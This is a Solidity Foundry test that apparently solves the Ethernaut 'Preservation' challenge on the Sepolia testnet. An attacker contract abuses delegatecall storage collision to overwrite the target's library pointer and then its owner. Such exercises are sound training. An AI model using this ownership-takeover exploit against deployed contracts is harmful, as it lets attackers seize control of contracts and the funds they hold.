//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;
//contract address in sepolia: 0x7C2ddB73B7b1c601f2dBC085D6Ac3aD0F2fb42BC
import "forge-std/Test.sol";
import "forge-std/console.sol";

// run this test in a sepolia fork
contract takeOffOwnership is Test {
    hackPreservation hack;
    address contra = 0x7C2ddB73B7b1c601f2dBC085D6Ac3aD0F2fb42BC;
    address me = 0x4948F43e559A38C1fDbeB2d7C5476d3c0Bda15E7;

    function setUp() public {
        hack = new hackPreservation();
    }

    function testHack() public {
        hack.callDelegate();
        (, bytes memory data) = contra.call(
            abi.encodeWithSignature("timeZone1Library()")
        );
        address t = abi.decode(data, (address));
        assertEq(address(hack), t);
        hack.callDelegate2();
        (, bytes memory dat) = contra.staticcall(
            abi.encodeWithSignature("owner()")
        );
        address tt = abi.decode(dat, (address));
        assertEq(tt, me);
    }
}

contract hackPreservation {
    // implement the same variables of the contract ;
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    address contra = 0x7C2ddB73B7b1c601f2dBC085D6Ac3aD0F2fb42BC;
    uint addressUint = uint256(uint160(address(this)));
    uint me = uint256(uint160(0x4948F43e559A38C1fDbeB2d7C5476d3c0Bda15E7));

    function setTime(uint time) public {
        // call the settimezone function by passing our address
        owner = address(uint160(uint(time)));
    }

    function callDelegate() public {
        // call the first time to change the library to this contract
        // call the second time to excute this code of the contract;
        (bool ok, ) = contra.call(
            abi.encodeWithSignature("setFirstTime(uint256)", addressUint)
        );
        require(ok, "tx failed");
    }

    function callDelegate2() public {
        // call the first time to change the library to this contract
        // call the second time to excute this code of the contract;
        (bool ok, ) = contra.call(
            abi.encodeWithSignature("setFirstTime(uint256)", me)
        );
        require(ok, "tx failed");
    }
}
